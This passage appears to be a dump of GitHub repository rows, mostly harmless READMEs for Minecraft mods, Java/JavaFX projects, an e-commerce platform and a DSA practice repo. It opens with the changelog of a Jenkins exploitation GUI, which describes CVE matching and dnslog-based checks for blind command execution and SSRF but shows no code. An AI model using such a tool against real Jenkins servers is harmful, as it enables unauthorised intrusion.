- 以yhy0师傅的模板项目 https://github.com/yhy0/ExpDemo-JavaFX 为模板,写出了jenkins综合漏洞利用工具
- 部分python的poc还未转成java代码接入到工具中,就打包成可执行文件
### v1.1
- 添加Jenkins指纹验证和版本获取功能,使得能够通过版本先匹配一下CVE
- 修复进行all检测后还得再次对特定的CVE进行检测的bug(经过版本检测后直接转到对应的CVE检测)
### v1.2
- 可以配置dnslog.pw或ceye.io dnslog平台来进行自动化无回显命令执行或SSRF验证
### v1.3
- 测试在macOS上的运行情况

## Stargazers over time
[![Stargazers over time](https://starchart.cc/TheBeastofwar/JenkinsExploit-GUI.svg?variant=adaptive)](https://starchart.cc/TheBeastofwar/JenkinsExploit-GUI)
",4,12,1,
aliakh/demo-java-virtual-threads,main,,0,0,1,
Rearth/Oritech,1.21,"<br/>
<p align=""center"">
  <a href=""https://github.com/rearth/Oritech"">
    <img src=""https://github.com/Rearth/Oritech/assets/10100603/d459b3fa-ef6f-4675-99d7-c44a78a3cf71"" alt=""Logo"" width=""80"" height=""80"">
  </a>

<h3 align=""center"">Oritech</h3>

<div align=""center"">
  A minecraft fabric tech mod, currently still WIP. Just like this readme.
  <br/>
  <br/>
  <a href=""https://github.com/rearth/Oritech""><strong>Explore the docs TODO»</strong></a>
  <br/>
  <br/>
  <a href=""https://github.com/rearth/Oritech/issues"">Report Bug</a>
  .
  <a href=""https://github.com/rearth/Oritech/issues"">Request Feature</a>
  <br/>
  <br/>
  <br/>

  ![Downloads](https://img.shields.io/github/downloads/rearth/Oritech/total) ![Stargazers](https://img.shields.io/github/stars/rearth/Oritech?style=social) ![Issues](https://img.shields.io/github/issues/rearth/Oritech) ![License](https://img.shields.io/github/license/rearth/Oritech) ![Discord](https://img.shields.io/discord/1233448016128512082)


  
</div>

---
<p align=""center"">
  <img src=""https://github.com/Rearth/Oritech/assets/10100603/bb99651d-d9af-48e2-9b00-6fb980517e0a"" />
</p>
<p align=""center"">
  <img src=""https://github.com/Rearth/Oritech/assets/10100603/be0fd041-40fc-40c3-a273-976140e89e90"" />
</p>
<p align=""center"">
  <img src=""https://github.com/Rearth/Oritech/assets/10100603/b76bf232-74e7-4a17-8166-89d1c80f738e"" />
</p>

---

## About The Project


An upcoming tech mod for minecraft fabric. Features advanced ore processing, powered tools and armor, and much much more.

Currently in very early access, numerous bugs and issues are to be expected.

If you want to contribute, suggest ideas or just see what's planned, make sure to check out the GitHub discussions for this project (https://github.com/Rearth/Oritech/discussions).

Includes REI and EMI compatibility.

Forge-compatible with sinytra connector on 1.21.

Extra mod compatibilities (allowing metals and other components to be processed in Oritech machines, and vice-versa) for the following mode are included:
- Alloy Forgery
- Tech Reborn
- Energized Power
- Mythic Metals

The following translations are available:
- English
- Chinese (by PlatinumOak)
- Brazilian Portuguese (by RenanEuzebio)
- Russian (by nuchohent)

## Built With

- Fabric API
- Owo lib (for all the GUIs, config, and much more)
- Geckolib (for the animations)
- Lavender (for the guide book)
- Blockbench (to create and animate the models)

## Installation

Install it just like any mod by dragging it into the mods folder. Make sure you have the following dependencies installed (newer version might work too):

- Minecraft Version: fabric-1.21
- Fabric loader 0.15.9
- Fabric api 0.97.0+1.20.4
- Owo lib 0.12.6+1.20.3
- Lavender 0.1.7+1.20.3
- Geckolib 1.20.4:4.4.4
- Reborn Energy API 3.0.0
- Athena 4.0.0 (important: If you have sodium installed, Athena, and in turn Oritech, will break without indium)

## Roadmap

See the [open issues](https://github.com/rearth/Oritech/issues) for a list of proposed features (and known issues).

## Contributing

Contributions are what make the open source community such an amazing place to be learn, inspire, and create. Any
contributions you make are **greatly appreciated**.

* If you have suggestions for adding or removing projects, feel free
  to [open an issue](https://github.com/rearth/Oritech/issues/new) to discuss it, or directly create a pull request
  after you edit the *README.md* file with necessary changes.
* Please make sure you check your spelling and grammar.
* Create individual PR for each suggestion.
* Please also read through the [Code Of Conduct](https://github.com/rearth/Oritech/blob/main/CODE_OF_CONDUCT.md) before
  posting your first idea as well.

### Creating A Pull Request

1. Fork the Project
2. Create your Feature Branch (`git checkout -b feature/AmazingFeature`)
3. Commit your Changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the Branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

## Credits

This mod is heavily inspired by the original techarium mod, which sadly never got finished. A lot of the machine names and models
were taken or strongly inspired by techarium. Huge thanks to the original techarium devs (YCar and Gecko and everyone else involved) for creating
the assets and ideas, and also for making them available under the [CC BY-NC 4.0 DEED](https://creativecommons.org/licenses/by-nc/4.0/) license.

Some blocks and item textures are also from malcolmriley's unused-textures repository. Huge thanks to him for making those available as well (under the [CC BY 4.0 DEED](https://creativecommons.org/licenses/by/4.0/) license).

In detail, these are the following items that are from the above-mentioned sources:
* From [ArtOfTecharium](https://github.com/Ycarx/artoftecharium) (animations and textures were slightly modified, e.g. addon ports added, etc.)
  * Assembler Model
  * Foundry Model
  * Laser Arm Model
  * Powered Furnace Model
  * Energy Acceptor Model
  * Machine Extender Texture
  * Exosuit Model
  * Deep Drill Model
  * Ceiling Lights
  * Tech Door, Lever, Button
  * Machine Platings
  * Metal Beam
  * Charger Model (heavily modified)
* From [malcolmriley's unused-textures repo](https://github.com/malcolmriley/unused-textures)
  * Oil fluid textures (the dark gas texture)
  * The withered crop textures
  * Most of the crafting component textures

## Acknowledgements

* Kekie6, for creating the energy pipe and big solar panel models
* glisco, the creator of owo-lib, for creating this awesome library and supporting in its usage
* unilock, for providing most of the work on the EMI integration
* The creators and maintainers of Geckolib for creating the great animation engine, and helping out in their discord
* [LyFl0w's texture maker](https://github.com/LyFl0w/TextureMaker), which has been used for a lot of the other mod textures
* Ycar, for creating all tiers of the machine core textures
* BBoldt and BLOKBUSTR, for fixing a series of issues with the textures, and generally improving and redesigning almost all the metal component textures
* jshipley, for a lot of contributions with new features, block, mechanics and bugfixes",19,10,5,CC0-1.0
MincraftEinstein/SubtleEffects,main,"# Subtle Effects

![Banner](https://imgur.com/yVBI5Qb.png)

![](https://img.shields.io/badge/Mod%20Loaders-NeoForge%20%26%20Fabric-green?style=for-the-badge)
[![Curseforge Page](https://img.shields.io/badge/Curseforge-Page-orange?style=for-the-badge&logo=curseforge ""Curseforge page"")](https://curseforge.com/minecraft/mc-mods/subtle-effects)
[![Modrinth Page](https://img.shields.io/badge/Modrinth-Page-1bd96a?style=for-the-badge&logo=modrinth)](https://modrinth.com/mod/subtle-effects)
[![Github](https://img.shields.io/badge/GitHub-Repository-blueviolet?style=for-the-badge&logo=github)](https://github.com/MincraftEinstein/SubtleEffects)
[![Discord Invite](https://img.shields.io/badge/Discord-Einstein%27s%20Lab-blue?style=for-the-badge&logo=discord)](https://discord.gg/gSsaFAvrBM)

### **📘 Description**
Adding many new subtle details through particles and a few sounds. All of which can be toggled and some can be customized. The mod also comes with built-in particle culling and a particle render distance

**✨ Some Key Features**
- Particle culling
- Particle render distance
- Fire related blocks (fire, campfires, candles, torches, etc) have sparks
- Villagers and players snore and have Z particles
- Slimes leave a trail of slime
- Glowstone and redstone blocks emit dust particles
- Allay and Vexes emit magic
- Shearing a sheep drops fluff
- Burning entities have sparks, smoke and flames
- Vanilla smoke has been replaced with updated textures similar to campfire smoke
- Players with 3 hearts or less have a heartbeat
- Players with 3 hunger or less have stomach growling
- Wearing a mob head will apply the spectator shader for that mob (currently only for the creeper head and Enderman head from Supplemenaries)
- Players and a few mobs have running dust clouds
- Mobs have dust clouds when they hit the ground
- And much more...

A full list of features can be found on the [wiki](https://github.com/MincraftEinstein/SubtleEffects/wiki).

Requires [Fzzy Config](https://modrinth.com/mod/fzzy-config).

<br>
<details>
<summary><b>📜 Terms of Use</b></summary>

```
You may
✅ Use this mod as a reference to understand and or create something of your own, as long as it is not a copy or recreation
✅ Use this mod in modpacks with credit and one or more links to any of the project pages*
✅ Edit for personal use
✅ Use this mod for/in YouTube videos with credit and one or more links to any of the project pages*
✅ Create resource packs, data packs, and addon mods for this mod

You may not
❌ Reupload/publish this mod to any website without explicit permission from me and one or more links to any of the project pages*
❌ Redistibute edited or unedited assets** from this mod without permission from me and credit

* Project pages include CurseForge, Modrinth, Planet Minecraft, GitHub
** Assets include logos, banners, textures, models etc
```
</details>

[<img alt=""Ko-fi Badge"" height=""15%"" width=""15%"" src=""https://storage.ko-fi.com/cdn/brandasset/kofi_bg_tag_dark.png"" alt=""Ko-fi badge"">](https://ko-fi.com/mincrafteinstein)

---

### 📚 F.A.Q

**Q:** Can XYZ feature be disabled?
<br>
**A:** Yes, all features can be disabled in the config menu.
If you find that a feature/change cannot be disabled please report it as a bug

**Q:** Can vanilla clients or clients without the mod join if the mod is installed on the server?
<br>
**A:** Yes, the mod does not need to be installed on the client to join

**Q:** Does this mod work with Fancy Block Particles, Particle Core, Visuality, or Particular?
<br>
**A:** Yes

**Q:** Particular's leaves aren't showing, how do I fix them?
<br>
**A:** Disable the 'Cull Particles With No Alpha' config inside the 'General' config section

**Q:** Do you take suggestions/feature requests?
<br>
**A:** Yes, suggestions and feedback in general are much appreciated.
You can provide feedback/suggestions in a GitHub issue, the CurseForge comments, or on my Discord Server.
Please keep your suggestions somewhat Minecraft-y, e.g. no blood.
Please also try not to suggest things that multiple other mods implement, such as rain ripples.

---

### **💬 Translations**
Feel free to translate this mod into any language or update existing translations.
To get your translation into the mod, make a pull request on GitHub with the translated language file.

All translators are credited in the list below.

- Simplified Chinese: [kuhananxianglai](https://github.com/kuhananxianglai)

---

Want to play with your friends on a server? Get 15% off your first month with code `einstein`.
Click [here](https://billing.kinetichosting.net/aff.php?aff=124) or on the banner below to get started!

[![Kinetic Hosting Banner](https://i.imgur.com/u6Fn0I0.png)](https://billing.kinetichosting.net/aff.php?aff=124)

---

Repository created from [MultiLoader-Template](https://github.com/jaredlll08/MultiLoader-Template)
",0,8,2,
DragunWF/Student-Admissions,main,"# Student Admissions

## Description

Hello, this is an old project. It is a simple Java GUI app where you can apply a student based on the information you input _(With validation of input in the background)_. Furthermore, you can accept or reject students if you're on the _Admissions Officer_ menu. There's also a page where you can view all students that are applying and pending for registration. 

## Images of the Application

### User Type Menu

![](images/UserTypeMenu.JPG)

### Student Menu

![](images/StudentMenu.JPG)

### Student Information Menu

![](images/StudentInformationMenu.JPG)
![](images/StudentInformationMenuConfirmation.JPG)

### Admissions Officer Menu

![](images/AdmissionsOfficerMenu.JPG)

### View Students Menu

![](images/ViewStudentsMenu1.JPG)
![](images/ViewStudentsMenu2.JPG)

### Accept or Reject Student Menu

![](images/AcceptOrRejectStudentMenu.JPG)
![](images/AcceptedStudent.JPG)
![](images/RejectedStudent.JPG)
![](images/InputValidation-AcceptOrReject.JPG)
",0,0,1,
quarkiverse/quarkus-fx,main,"# quarkus-fx

[![Version](https://img.shields.io/maven-central/v/io.quarkiverse.fx/quarkus-fx-parent?logo=apache-maven&style=flat-square)](https://search.maven.org/artifact/io.quarkiverse.fx/quarkus-fx)

<!-- ALL-CONTRIBUTORS-BADGE:START - Do not remove or modify this section -->
[![All Contributors](https://img.shields.io/badge/all_contributors-4-orange.svg?style=flat-square)](#contributors-)
<!-- ALL-CONTRIBUTORS-BADGE:END -->
This Quarkus extension allows you to use JavaFX in your Quarkus application. \
It will allow component injection in FX Controllers and will allow you to use CDI events to register on primary stage creation.

Please refer to documentation available at https://docs.quarkiverse.io/quarkus-fx/dev/index.html

You will be able to register on primary stage creation event via such code example.
```java
public class QuarkusFxApp {

  @Inject
  FXMLLoader fxmlLoader;

  public void start(@Observes final FxPostStartupEvent event) {
    try {
      InputStream fxml = this.getClass().getResourceAsStream(""/app.fxml"");
      Parent fxmlParent = this.fxmlLoader.load(fxml);

      Stage stage = event.getPrimaryStage();
      
      Scene scene = new Scene(fxmlParent);
      stage.setScene(scene);
      stage.show();

    } catch (IOException e) {
      // Handle error
    }
  }
}
```
To load multiple FXML files, you can use :
```java
@Inject
Instance<FXMLLoader> fxmlLoader;
```

Also, setting the location is required by some use cases (use of relative paths in FXML)
```java
FXMLLoader loader = this.fxmlLoader.get();
// Set location for relative path resolution
loader.setLocation(xxx);
```

For some sample apps and usage, check the `samples/` directory.

## Contributors ✨

Thanks goes to these wonderful people ([emoji key](https://allcontributors.org/docs/en/emoji-key)):

<!-- ALL-CONTRIBUTORS-LIST:START - Do not remove or modify this section -->
<!-- prettier-ignore-start -->
<!-- markdownlint-disable -->
<table>
  <tbody>
    <tr>
      <td align=""center"" valign=""top"" width=""14.28%""><a href=""https://github.com/CodeSimcoe""><img src=""https://avatars.githubusercontent.com/u/110094118?v=4?s=100"" width=""100px;"" alt=""Clément de Tastes""/><br /><sub><b>Clément de Tastes</b></sub></a><br /><a href=""https://github.com/quarkiverse/quarkus-fx/commits?author=CodeSimcoe"" title=""Code"">💻</a> <a href=""#maintenance-CodeSimcoe"" title=""Maintenance"">🚧</a></td>
      <td align=""center"" valign=""top"" width=""14.28%""><a href=""https://github.com/ghazyami""><img src=""https://avatars.githubusercontent.com/u/7247810?v=4?s=100"" width=""100px;"" alt=""Ghazy Abdallah""/><br /><sub><b>Ghazy Abdallah</b></sub></a><br /><a href=""https://github.com/quarkiverse/quarkus-fx/commits?author=ghazyami"" title=""Code"">💻</a></td>
      <td align=""center"" valign=""top"" width=""14.28%""><a href=""http://www.jboss.org""><img src=""https://avatars.githubusercontent.com/u/332210?v=4?s=100"" width=""100px;"" alt=""Scott M Stark""/><br /><sub><b>Scott M Stark</b></sub></a><br /><a href=""https://github.com/quarkiverse/quarkus-fx/commits?author=starksm64"" title=""Code"">💻</a></td>
      <td align=""center"" valign=""top"" width=""14.28%""><a href=""https://fouad.io""><img src=""https://avatars.githubusercontent.com/u/1194488?v=4?s=100"" width=""100px;"" alt=""Fouad Almalki""/><br /><sub><b>Fouad Almalki</b></sub></a><br /><a href=""https://github.com/quarkiverse/quarkus-fx/commits?author=Eng-Fouad"" title=""Code"">💻</a></td>
    </tr>
  </tbody>
</table>

<!-- markdownlint-restore -->
<!-- prettier-ignore-end -->

<!-- ALL-CONTRIBUTORS-LIST:END -->

This project follows the [all-contributors](https://github.com/all-contributors/all-contributors) specification. Contributions of any kind welcome!
",4,5,2,Apache-2.0
BizSpringSource/bizspring-vue3-opensource,master,"  **跨境电商是在不同国家或地区之间进行在线交易的商业活动，其本质是通过互联网技术和全球物流网络打破传统贸易壁垒，为消费者提供更加多元化、便捷化、优质化的购物体验，同时为卖家提供更广阔的市场和更高的销售机会。**

  做好跨境电商要选择合适的产品，了解海外市场，选择合适的跨境电商平台，**建设独立站树立品牌形象，制定合适的定价策略，提供优质的售后服务，创新营销模式**。

# BizSpring商城、跨境电商，专注精品独立站
### 开源文档
[http://docs.bizspring.cn](http://docs.bizspring.cn)

### 开源地址
#### Github
[https://github.com/BizSpringSource/bizspring-vue3-opensource.git](https://github.com/BizSpringSource/bizspring-vue3-opensource.git)
# BizSpring核心开源框架

| 名称 | 框架 |
|--|--|
| 核心框架 | spring boot、spring cloud、spring cloud alibaba |
| 注册中心 | nacos |
|  负载均衡| Spring Cloud Load balancer |
| 服务调用: | open feign |
|  服务容错:| Alibaba sentinel |
| api网关 |  spring cloud gateway|
| 分布式事务:| seata |
|持久层框架  | MyBatis-plus |
| 高性能缓存 | redis redisson |
| 文件管理 | Alibaba oss |
| SMS短信  | Alibaba SMS |
| 安全 | oauth2+jwt |
| 数据库 |mysql8+  |
| API管理| swagger  |
| 搜索引擎 | elasticsearch |
| JDK版本| Java8+  |
| PC端前段框架 | vue3+elementPlus |
| 商家框架 |Uniapp+vue(一套代码多平台发布)  |
| 商城框架 | Uniapp+vue(一套代码多平台发布)  |

# BizSpring电商平台概述

BizSpring电商平台，是基于最新Spring Cloud 微服务架构开发的多语言电商平台，使用领先的 Vue3.0+ElementPlus + uniapp技术开发的移动全端业务、实现了多平台同步构建及建设的解决方案。应用发布基于Uni-app，实现跨多个平台( H5、公众号、头条、抖音、小程序、iOS、Android 等 )使用。

# 跨境客户
**跨境电商运营需求**<br />在不同国家或地区之间进行在线交易的商业活动，其本质是通过互联网技术和全球物流网络打破传统贸易壁垒，为消费者提供更加多元化、便捷化、优质化的购物体验，同时为卖家提供更广阔的市场和更高的销售机会。

**海外电子商务运营**<br />在海外从事电子商务业务的客户，他们负责在国外网络上销售和提供在线交易业务，也被称为国际电商运营者、他们需要电商系统支持当地语言，对接当地在线支付系统及物流仓储平台，建立适于海外或当地发展的电商平台，扩展其销售业务。

**移动电商运营者**<br />这些管理者、卖家可能没有固定的店铺、办公场所或长期移动办公，通过互联网和移动设备来管理自己的商品信息和订单。卖家使用电商平台提供的在线店铺管理工具或第三方软件来管理自己的商品库存、订单处理、发货等日常业务。相比于传统的实体店铺，这种电商经营模式具有更高的灵活性和便利性。

**需要技术领先、稳定健壮的系统、二次开发再开发**<br />需要领先的技术、扩展性好、运营稳定、需要灵活扩展业务的系统、并具备一定开发能力的客户。这些客户通常会选择使用新技术来提高他们的业务效率和开发能力，同时也会考虑如何让他们的软件系统具有良好的扩展性和稳定性，以便更好地满足业务需求和未来发展的需要，提高自身的市场竞争力。

# 使用场景
BizSpring电商平台实现移动全渠道消费者覆盖，手机触屏商城、移动微信商城、微信小程序商城、抖音小程序商城、QQ小程序商城、快手小程序商城、小红书小程序商城、钉钉小程序商城版、苹果APP商城及安卓APP商城，数据统一运营，让您一次开店，全通路覆盖。

**自营商业运营模式**<br />企业通过建立自营商城平台，整合自身渠道业务。通过会员、商品、订单、财务和库存等的管理，对线下线上多渠道业务进行统一管理。

**联营商业运营模式**<br />整合多方渠道供应商，以商品入库、统一仓储、统一物流的方式进行入库联营。平台自身通过代销或者直销的方式，将伙伴供应商资源纳入平台自营体系，建立多个自营店铺，多样化商品和服务品类，整合行业资源。平台与伙伴供应商以不同的方式定期进行财务结算。

**招商模式**<br />平台企业通过建立线上商城，签约多方渠道供应商，通过会员、交易、平台和财务等管理，对平台进行运营。多方渠道供应商，以加盟签约形式，入驻B2B2C平台。入驻商家可自行管理商品、订单、仓储、物流、售后服务、营销推广等业务，定期与平台进行财务结算，入驻商家通过大平台流量、资源、营销服务等业务优势，强化自身品牌知名度，提高交易转化率。平台则可以多样化商品和服务品类，整合行业资源，收取商家等级费用、类目使用费用和平台佣金等。

**混合模式**<br />一般为自营+招商、自营+联营+招商等模式，平台企业通过建立自营线上商城，整合自身多渠道业务，通过会员、商品、订单、财务和库存等管理系统，对线下线上多渠道业务进行统一管理。同时整合多方渠道供应商，以加盟签约形式，入驻B2B2C平台。入驻商家可自行管理商品、订单、仓储、物流、售后服务、营销推广等业务，定期与平台进行财务结算，商家无需自建电商平台通过大平台流量、资源、营销服务等业务优势，强化自身品牌知名度，提高交易转化率。平台则可以多样化商品和服务品类，整合行业资源，收取商家营销推广费用、类目使用费用和平台佣金等。
# 商城优势
### 电商业务完全掌上操作

**BizSpring移动全端是基于ElementPlus + uniapp开发的移动端多平台同步构建的电商建设解决方案**。此架构一次开发发布到多个平台（H5、公众号、头条、抖音、小程序、iOS、Android 等），实现跨平台应用的快速建设和落地。

- 最新的 UI 界面设计
- 一次开发，跨平台发布，投入少、产出高
- 移动全端，使用便捷、业务扩展快
### 全端语言国际化

1. **对于国际化电商、跨境电商及海外商运营者，实现电商语言国际化是必要的工作**。他们通常着眼于全球范围内贸易和客户，这样的贸易不仅让本国国民可以购买外国商品，也让外国消费者可以选择其本国商品实现双向贸易，只有具有逾越各种语言和文化习惯的用户群，才能取得更大的市场份额。
2. **对于地方化语言电商运营者、多语言平台可以帮助企业实现地方化、区域化业务运营及扩展**。通过多种语言平台，企业可以更好地与来自不同文化背景的客户进行贸易，增加销售额和盈利能力。
3. **多语言电商平台可以提高用户体验和满意度**。通过提供用户习惯使用的语言版本，用户可以更方便地使用平台和应用程序，减少沟通障碍和误解，提高用户忠诚度。
4. **多语言平台还可以帮助企业或组织增强其国际形象和声誉**。提供多种语言版本可以显示企业对全球市场的重视和尊重，使其更具吸引力。
### 商城业务基于多服务架构
**BizSpring 电商平台使用业内优秀的架构设计理念**，将电商整套流程包括商品（product）、订单(order)，店铺(store)、营销(marketing)分别建设为不同的服务，降低了电商系统业务的耦合性，各服务可单独部署及集群化，提升了平台综合抗压能力，架构的灵活性和扩展性为产品后期升级服务提供捷径。

- Elasticsearch搜素引擎
- Redis缓存集群
- Nacos注册中心
- OpenFeign Ribbon负载均衡
# BizSpring 产品功能
**移动管理平台**<br />BizSpring管理平台使用响应式Web开发，使管理平台适配电脑、平板、手机等，有网即可管理，管理平台，是维护多店的后台系统，包括店铺管理、商品管理、订单管理、库存管理、促销管理、用户管理等多项功能，管理平台，能监管跟踪、订单销售数据，以及查看和分析销售环节、维护交易公平可靠。辅助商家更好地服务他们的客户。

**移动商家平台**<br />BizSpring商家平台，让商家随时随地都能办公，无需在固定的地点维护自店商品。商家平台可以上传和编辑商品信息、设置价格、安排促销活动。除了基本的商品信息和价格设置，商家还可以在这里提供特殊的折扣或优惠，发布新品信息，发布营销活动等。此外，商家还可以通过该平台跟踪他们的订单状态，管理库存，以及查看和分析销售数据。

**移动客户平台**<br />BizSpring客户平台，让消费者可以在任何地方、任何时间进行购物。客户端设计简洁，使用方便。消费者可以直接在移动设备上浏览和购买商品，也可以享受个性化的推荐和服务，查看商品详情，比较不同商家的价格和质量，下订单并支付。客户端平台也提供消费者与商家的沟通渠道，消费者可以提出问题或反馈，商家可以提供解答和服务。
# 系统预览
![跨境电商预览.jpg](https://upload-images.jianshu.io/upload_images/28926578-c92f4a5fac5a8e26.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

# 试用体验

| 系统 | APP下载 | H5 URL |
|--|--|--|
| 商城 | https://cross-border.bizspring.cn/shop.apk | https://cross-border.bizspring.cn/shop/# |
| 商家 | https://cross-border.bizspring.cn/merchant.apk | https://cross-border.bizspring.cn/merchant/# |
| 管理 |  |  https://cross-border.bizspring.cn |

# 实施及售后
### 安装前准备
我方提供电商平台的部署实施工作，客户需要准备的硬件环境，软件环境，网络环境，见部署准备文档
### 售后内容
**技术支持**

1. 系统操作：我们提供软件各端操作说明，包括商城、商家、管理软件功能及系统说明、常见问题解决等。以帮助用户更好地使用系统。
2. 技术支持：提供7*12（9:00-21:00）小时技术咨询，解决用户在使用过程中遇到的技术问题，包括软件故障、配置问题等。

**软件升级及漏洞修复**

1. 软件升级：BizSpring产品终生迭代升级，正常付费的客户联系客服确定升级不影响系统业务后，我方技术人员提供升级服务，确保客户软件保持最新版本，具备最新的功能和性能。
2. 漏洞修复：客户发现影响使用的系统漏洞、缺陷、业务需求等，提交我方售后客服。我方定期做评估，进行修复、确保软件的安全性和稳定性。

**客户支持及反馈接收**

- 客户支持：为进一步提升我产品各方面体验，建立客户支持渠道，收集系统缺陷、更新需求和解答用户的问题和疑虑，提高用户满意度。
## 技术服务
- 销售-阿真 微信号： 16619915737
- QQ技术交流群： 576790917
- 公众号：BizSpring
- 扫码了解开源跨境电商平台

![](https://upload-images.jianshu.io/upload_images/28926578-a28bc778b0299bee.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
",0,0,1,AGPL-3.0
codeIntrovert/90daysOfDSA,main,"
<div align=""center"">

  <img src=""assets/logo.png"" alt=""logo"" width=""450"" height=""auto"" />
  
  <p>
    Get Job Ready with 90 Leetcode Problems!  
  </p>
  <p>
   <strong>Starting Soon On <a href=""https://www.youtube.com/introvertCoder"">My Youtube Channel</a> !</strong>
  </p>
  <p>
    A <a href=""https://codecolts.vercel.app/"">CodeColts</a> Project
  </p>

  
<!-- Badges -->
<p>
  <a href=""https://github.com/codeintrovert/90DaysOfDSA/graphs/contributors"">
    <img src=""https://img.shields.io/github/contributors/codeIntrovert/90DaysOfDSA"" alt=""contributors"" />
  </a>
  <a href=""https://github.com/codeintrovert/90DaysOfDSA/commits/main"">
    <img src=""https://img.shields.io/github/last-commit/codeIntrovert/90DaysOfDSA"" alt=""last update"" />
  </a>
  <a href=""https://github.com/codeintrovert/90DaysOfDSA/network/members"">
    <img src=""https://img.shields.io/github/forks/codeIntrovert/90DaysOfDSA"" alt=""forks"" />
  </a>
  <a href=""https://github.com/codeintrovert/90DaysOfDSA/stargazers"">
    <img src=""https://img.shields.io/github/stars/codeIntrovert/90DaysOfDSA"" alt=""stars"" />
  </a>
<a rel=""license"" href=""http://creativecommons.org/licenses/by-nc-nd/4.0/""><img width=""66"" height=""23.3"" alt=""Creative Commons License"" style=""border-width:0"" src=""https://i.creativecommons.org/l/by-nc-nd/4.0/88x31.png"" /></a>

[![YouTube Channel Views](https://img.shields.io/youtube/channel/views/UCKkj-sW42Jj2eS6UlvbEgsA?label=IntrovertCoder)](https://www.youtube.com/introvertCoder/)
</p>
   
<h4>
    <a href=""https://github.com/codeIntrovert/90daysOfDSA/tree/main/src"">View Code</a>
  <span> · </span>
    <a href=""https://github.com/codeIntrovert/90daysOfDSA/blob/main/README.md"">Documentation</a>
  <span> · </span>
    <a href=""https://github.com/codeintrovert/90DaysOfDSAe/issues/"">Report Bug</a>
  <span> · </span>
    <a href=""https://github.com/codeintrovert/90DaysOfDSA/issues/"">Request Feature</a>
  </h4>
</div>

<br />

<!-- About the Project -->
## :star2: About the Project

<div align=""center""> 
  Welcome to the ""90 Days of DSA"" repository! 🎉 This is your one-stop destination for daily coding practice with Data Structures and Algorithms (DSA) problems. Whether you are preparing for technical interviews or just looking to enhance your problem-solving skills, we've got you covered!
  
  <hr>
  <img src=""http://ForTheBadge.com/images/badges/made-with-java.svg"">




</div>

## 📅 Daily Challenge

Each day, we'll release a new DSA problem along with its solution. You can use this repository to:

- 🧠 Learn and understand various DSA concepts.
- 💻 Implement solutions in Java.
- 🚀 Sharpen your problem-solving skills.

Feel free to contribute your own solutions or improve existing ones! Let's learn and grow together as a community.

## 🛠️ Getting Started

1. Clone the repository to your local machine:

```bash
git clone https://github.com/codeintrovert/90DaysOfDSA
```
2. Navigate to the `src` folder
```bash 
cd ./90DaysOfDSA/src
```

<!-- TechStack -->
## :space_invader: Tech Stack


  - Java 
  - TypeScript 
  - Python 



<!-- Usage -->
## :eyes: Live Project Coming Soon! 
<ul><li>
<a href=""https://youtube.com/introvertCoder"">Youtube Series Starting Soon!</a>
</li>
<li>
<a href=""https://codecolts.vercel.app/"">CodeColts</a>
</li>
</ul>

<!-- Roadmap -->
## :compass: Roadmap
- Video Series Comming Soon!
* [x] 10 Days Problem Solving Streak
* [x] 20 Days Problem Solving Streak
* [x] 40 Days Problem Solving Streak
* [x] 60 Days Problem Solving Streak
* [ ] 90 Days Problem Solving Streak


<!-- Contributing -->
## 🤝 Contributing

<a href=""https://github.com/codeintrovert/90DaysOfDSA/graphs/contributors"">
  <img src=""https://contrib.rocks/image?repo=codeintrovert/90DaysOfDSA"" />
</a>


Contributions are welcome and encouraged! Whether you find a bug, have a suggestion, or want to add your own solution, please follow the [contribution guidelines](https://github.com/codeIntrovert/90daysOfDSA/blob/main/CONTRIBUTING.md)


<!-- License -->
## :warning: License

The materials herein are all &copy; 2023 Hasan Imam.

<a rel=""license"" href=""http://creativecommons.org/licenses/by-nc-nd/4.0/""><img alt=""Creative Commons License"" style=""border-width:0"" src=""https://i.creativecommons.org/l/by-nc-nd/4.0/88x31.png"" /></a><br />This work is licensed under a <a rel=""license"" href=""http://creativecommons.org/licenses/by-nc-nd/4.0/"">Creative Commons Attribution-NonCommercial-NoDerivs 4.0 Unported License</a>.


<!-- Contact -->
## :handshake: Contact

Hasan Imam

Email: codeColts@gmail.com
Instagram: [@introvertCoder](https://instagram.com/introvertcoder)
Youtube: [@introvertcoder](https://www.youtube.com/introvertCoder)
Discord: introvertCoder

<!-- Acknowledgments -->
## :gem: Acknowledgements

 - [LeetCode](https://leetcode.com/)
 - [CodeColts](https://codecolts.vercel.app/)
 - [Shields.io](https://shields.io/)
 - [Awesome README](https://github.com/matiassingers/awesome-readme)

## :pen: Developer's Note:
#### `5/May/2024`
```html
This GitHub Repo now has over 60 solutions,
We're back! repo will be updated with more solutions and a video series soon!

Feel free to open new issues or collaborate by fixing existing ones.
Stay tuned on my YouTube Channel for updates.
Happy Coding!
```

[![Youtube: introvertCoder](https://img.shields.io/badge/YouTube-FF0000?style=for-the-badge&logo=youtube&logoColor=white)](https://www.youtube.com/introvertCoder/)
",0,1,1,NOASSERTION
hardingadonis/saledock,main,"# Sale Dock

[![build](https://github.com/hardingadonis/saledock/actions/workflows/build.yml/badge.svg)](https://github.com/hardingadonis/saledock/actions/workflows/build.yml)
[![publish](https://github.com/hardingadonis/saledock/actions/workflows/publish.yml/badge.svg)](https://github.com/hardingadonis/saledock/actions/workflows/publish.yml)
[![release](https://github.com/hardingadonis/saledock/actions/workflows/release.yml/badge.svg)](https://github.com/hardingadonis/saledock/actions/workflows/release.yml)
[![CodeFactor](https://www.codefactor.io/repository/github/hardingadonis/saledock/badge)](https://www.codefactor.io/repository/github/hardingadonis/saledock)
![GitHub contributors](https://img.shields.io/github/contributors/hardingadonis/saledock)
![GitHub top language](https://img.shields.io/github/languages/top/hardingadonis/saledock)
![GitHub repo size](https://img.shields.io/github/repo-size/hardingadonis/saledock)
![GitHub License](https://img.shields.io/github/license/hardingadonis/saledock)

> SWP391 project, ERP system, Sales module

## Requirements

- JDK 17
- MySQL 8.2.0
- Tomcat 10
- Maven 3+

## Database

<details>
  <summary>Database</summary>

  <div style=""margin-top: 20px"">
    <a href=""https://github.com/hardingadonis/saledock"">
      <img src=""database/database.svg""/>
    </a>
  </div>
</details>

## Development

- You need to install the requirements above.

#### 1. Clone `Sale Dock`:

```bash
git clone https://github.com/hardingadonis/saledock.git
```

#### 2. Open `Sale Dock`:

- You can open `Sale Dock` with your favorite IDE:
  - [IntelliJ IDEA](https://www.jetbrains.com/idea/)
  - [Eclipse](https://www.eclipse.org/)
